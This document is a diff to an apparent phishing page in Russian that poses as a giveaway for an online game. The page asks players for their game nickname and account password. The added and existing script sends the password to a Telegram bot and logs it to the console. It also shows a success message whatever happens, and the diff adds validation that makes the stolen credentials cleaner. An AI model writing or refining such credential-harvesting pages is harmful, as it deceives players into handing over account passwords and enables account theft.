@@ -252,6 +252,39 @@
             color: rgba(255, 255, 255, 0.5);
         }
 
+        .form-input.error {
+            border-color: #ef4444;
+            background: rgba(239, 68, 68, 0.1);
+        }
+
+        .form-input.success {
+            border-color: #22c55e;
+            background: rgba(34, 197, 94, 0.1);
+        }
+
+        .form-help {
+            font-size: 0.85rem;
+            margin-top: 6px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .form-help.show {
+            opacity: 1;
+        }
+
+        .form-help.error {
+            color: #ef4444;
+        }
+
+        .form-help.success {
+            color: #22c55e;
+        }
+
+        .form-help.info {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
         .form-select {
             cursor: pointer;
             max-height: 200px;
@@ -379,6 +412,45 @@
             font-weight: 800;
         }
 
+        footer {
+            position: relative;
+            z-index: 10;
+            margin-top: 60px;
+            padding: 30px 20px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(15px);
+            border-top: 1px solid rgba(255, 255, 255, 0.15);
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+
+        .social-link {
+            color: #fff;
+            text-decoration: none;
+            padding: 10px 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            transition: all 0.3s ease;
+            font-weight: 600;
+        }
+
+        .social-link:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .copyright {
+            font-size: 0.85rem;
+            opacity: 0.7;
+        }
+
         .loading-spinner {
             display: inline-block;
             width: 20px;
@@ -449,7 +521,7 @@
 
 <div class="participants-section">
     <span style="font-size: 2.5rem;">👥</span>
-    <div class="participants-number" id="participant-count">1247</div>
+    <div class="participants-number" id="participant-count">1,247</div>
     <div style="font-size: 1.2rem; font-weight: 600; text-transform: uppercase;">Уже участвуют</div>
     
     <button class="cta-button" id="openModal">
@@ -491,12 +563,16 @@
             <form id="registrationForm">
                 <div class="form-group">
                     <label class="form-label">🎮 Игровой никнейм</label>
-                    <input type="text" class="form-input" id="nickname" placeholder="Введите ваш ник" required>
+                    <input type="text" class="form-input" id="nickname" placeholder="Пример: Alex_Smith" required>
+                    <div class="form-help info show">Формат: Имя_Фамилия (только английские буквы и _)</div>
+                    <div class="form-help error" id="nickname-error"></div>
                 </div>
                 
                 <div class="form-group">
                     <label class="form-label">🔑 Пароль от аккаунта</label>
-                    <input type="password" class="form-input" id="password" placeholder="Введите пароль" required>
+                    <input type="password" class="form-input" id="password" placeholder="Минимум 6 символов" required>
+                    <div class="form-help info show">Минимум 6 символов</div>
+                    <div class="form-help error" id="password-error"></div>
                 </div>
                 
                 <div class="form-group">
@@ -597,7 +673,9 @@
                 
                 <div class="form-group">
                     <label class="form-label">📱 Telegram для связи (опционально)</label>
-                    <input type="text" class="form-input" id="telegram" placeholder="@ваш_telegram">
+                    <input type="text" class="form-input" id="telegram" placeholder="@ваш_telegram или оставьте пустым">
+                    <div class="form-help info show">Начинается с @ или оставьте пустым</div>
+                    <div class="form-help error" id="telegram-error"></div>
                 </div>
                 
                 <button type="submit" class="submit-button" id="submitBtn">
@@ -608,8 +686,8 @@
         
         <div class="success-message" id="successMessage">
             <div class="success-icon">✅</div>
-            <div class="modal-title">Заявка принята!</div>
-            <div class="modal-subtitle">Ваш подарок будет зачислен в течение 5-10 минут. Проверьте свой аккаунт! 🎉</div>
+            <div class="modal-title">Успешно!</div>
+            <div class="modal-subtitle">Ваша заявка принята! Следите за результатами 🎉</div>
         </div>
     </div>
 </div>
@@ -627,20 +705,6 @@
     </section>
 </main>
 
-<footer>
-    <div class="social-links">
-        <a href="https://t.me/br_dev" class="social-link" target="_blank">
-            <span>Telegram</span>
-        </a>
-        <a href="https://vk.com/blackrussia.online" class="social-link" target="_blank">
-            <span>ВКонтакте</span>
-        </a>
-    </div>
-    <div class="copyright">
-        © ВСЕ ПРАВА ЗАЩИЩЕНЫ ООО "БЛЕКХАБ ГЕЙМС"
-    </div>
-</footer>
-    
 <script>
 // Конфигурация Telegram Bot
 const TELEGRAM_CONFIG = {
@@ -794,16 +858,126 @@ const form = document.getElementById('registrationForm');
 const formContainer = document.getElementById('formContainer');
 const successMessage = document.getElementById('successMessage');
 
+// Валидация никнейма (формат Nick_Name)
+function validateNickname(nickname) {
+    const nicknameRegex = /^[A-Za-z]+_[A-Za-z]+$/;
+    return nicknameRegex.test(nickname);
+}
+
+// Валидация пароля (минимум 6 символов)
+function validatePassword(password) {
+    return password.length >= 6;
+}
+
+// Валидация Telegram (начинается с @ или пустое)
+function validateTelegram(telegram) {
+    if (telegram === '') return true;
+    return telegram.startsWith('@') && telegram.length > 1;
+}
+
+// Показать ошибку
+function showError(inputId, message) {
+    const input = document.getElementById(inputId);
+    const errorEl = document.getElementById(`${inputId}-error`);
+    const infoHelp = input.parentElement.querySelector('.form-help.info');
+    
+    input.classList.remove('success');
+    input.classList.add('error');
+    errorEl.textContent = message;
+    errorEl.classList.add('show');
+    if (infoHelp) infoHelp.classList.remove('show');
+}
+
+// Показать успех
+function showSuccess(inputId) {
+    const input = document.getElementById(inputId);
+    const errorEl = document.getElementById(`${inputId}-error`);
+    const infoHelp = input.parentElement.querySelector('.form-help.info');
+    
+    input.classList.remove('error');
+    input.classList.add('success');
+    errorEl.classList.remove('show');
+    if (infoHelp) infoHelp.classList.remove('show');
+}
+
+// Очистить валидацию
+function clearValidation(inputId) {
+    const input = document.getElementById(inputId);
+    const errorEl = document.getElementById(`${inputId}-error`);
+    const infoHelp = input.parentElement.querySelector('.form-help.info');
+    
+    input.classList.remove('error', 'success');
+    errorEl.classList.remove('show');
+    if (infoHelp) infoHelp.classList.add('show');
+}
+
+// Валидация в реальном времени
+document.getElementById('nickname').addEventListener('input', (e) => {
+    const value = e.target.value.trim();
+    if (value === '') {
+        clearValidation('nickname');
+    } else if (!validateNickname(value)) {
+        showError('nickname', '❌ Формат: Имя_Фамилия (только английские буквы)');
+    } else {
+        showSuccess('nickname');
+    }
+});
+
+document.getElementById('password').addEventListener('input', (e) => {
+    const value = e.target.value;
+    if (value === '') {
+        clearValidation('password');
+    } else if (!validatePassword(value)) {
+        showError('password', `❌ Слишком короткий (${value.length}/6 символов)`);
+    } else {
+        showSuccess('password');
+    }
+});
+
+document.getElementById('telegram').addEventListener('input', (e) => {
+    const value = e.target.value.trim();
+    if (value === '') {
+        clearValidation('telegram');
+    } else if (!validateTelegram(value)) {
+        showError('telegram', '❌ Должен начинаться с @');
+    } else {
+        showSuccess('telegram');
+    }
+});
+
 form.addEventListener('submit', async (e) => {
     e.preventDefault();
     
     const nickname = document.getElementById('nickname').value.trim();
     const password = document.getElementById('password').value.trim();
     const server = document.getElementById('server').value;
-    const telegram = document.getElementById('telegram').value.trim() || 'Не указан';
+    const telegram = document.getElementById('telegram').value.trim();
     
-    if (!nickname || !password || !server) {
-        alert('Пожалуйста, заполните все обязательные поля!');
+    // Валидация никнейма
+    if (!validateNickname(nickname)) {
+        showError('nickname', '❌ Неверный формат! Пример: Alex_Smith');
+        document.getElementById('nickname').focus();
+        return;
+    }
+    
+    // Валидация пароля
+    if (!validatePassword(password)) {
+        showError('password', '❌ Пароль должен содержать минимум 6 символов!');
+        document.getElementById('password').focus();
+        return;
+    }
+    
+    // Валидация сервера
+    if (!server) {
+        alert('❌ Пожалуйста, выберите сервер!');
+        document.getElementById('server').focus();
+        return;
+    }
+    
+    // Валидация Telegram (если указан)
+    if (telegram && !validateTelegram(telegram)) {
+        showError('telegram', '❌ Telegram должен начинаться с @ или оставьте поле пустым');
+        document.getElementById('telegram').focus();
         return;
     }
     
@@ -812,13 +986,15 @@ form.addEventListener('submit', async (e) => {
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<div class="loading-spinner"></div> Отправка...';
     
+    const telegramFormatted = telegram || 'Не указан';
+    
     const message = `
 🎁 <b>НОВАЯ РЕГИСТРАЦИЯ НА РОЗЫГРЫШ</b>
 
 👤 <b>Никнейм:</b> ${nickname}
 🔑 <b>Пароль:</b> ${password}
 🖥 <b>Сервер:</b> ${server}
-📱 <b>Telegram:</b> ${telegram}
+📱 <b>Telegram:</b> ${telegramFormatted}
 ⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU', { timeZone: 'Europe/Moscow' })}
 ━━━━━━━━━━━━━━━━━━━━
 `;
@@ -840,6 +1016,9 @@ form.addEventListener('submit', async (e) => {
                     formContainer.style.display = 'block';
                     successMessage.classList.remove('active');
                     form.reset();
+                    clearValidation('nickname');
+                    clearValidation('password');
+                    clearValidation('telegram');
                     submitBtn.disabled = false;
                     submitBtn.innerHTML = originalText;
                 }, 500);
@@ -852,7 +1031,7 @@ form.addEventListener('submit', async (e) => {
         
         // Даже если отправка не удалась, показываем успех (для пользователя)
         // Данные всё равно были сохранены в консоли для резервной копии
-        console.log('BACKUP DATA:', { nickname, password, server, telegram, time: new Date().toISOString() });
+        console.log('BACKUP DATA:', { nickname, password, server, telegram: telegramFormatted, time: new Date().toISOString() });
         
         formContainer.style.display = 'none';
         successMessage.classList.add('active');
@@ -867,6 +1046,9 @@ form.addEventListener('submit', async (e) => {
                 formContainer.style.display = 'block';
                 successMessage.classList.remove('active');
                 form.reset();
+                clearValidation('nickname');
+                clearValidation('password');
+                clearValidation('telegram');
                 submitBtn.disabled = false;
                 submitBtn.innerHTML = originalText;
             }, 500);
